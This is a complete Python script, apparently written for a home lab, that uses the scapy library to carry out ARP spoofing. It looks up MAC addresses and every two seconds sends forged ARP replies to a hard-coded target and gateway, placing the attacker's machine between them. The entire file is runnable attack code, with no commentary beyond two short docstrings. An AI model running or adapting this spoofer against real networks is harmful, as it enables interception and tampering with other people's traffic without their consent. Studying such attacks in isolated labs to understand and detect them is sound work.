#!venv/bin/python

import scapy.all as scapy
import time


TARGET_IP = "192.168.56.104"
GATEWAY_IP = "192.168.56.102"


def get_mac(ip):
    """ Get mac address by ip """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(
        arp_request_broadcast,
        timeout=5,
        verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    """ Send fake arp answer to victim """
    arp_answer = scapy.ARP(
       op=2,
       pdst=target_ip,
       hwdst=get_mac(target_ip),
       psrc=spoof_ip
    )
    scapy.send(arp_answer, verbose=False)


if __name__ == "__main__":
    try:
        while(True):
            spoof(TARGET_IP, GATEWAY_IP)
            spoof(GATEWAY_IP, TARGET_IP)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Keyboard interruption - finishing spoofing.")
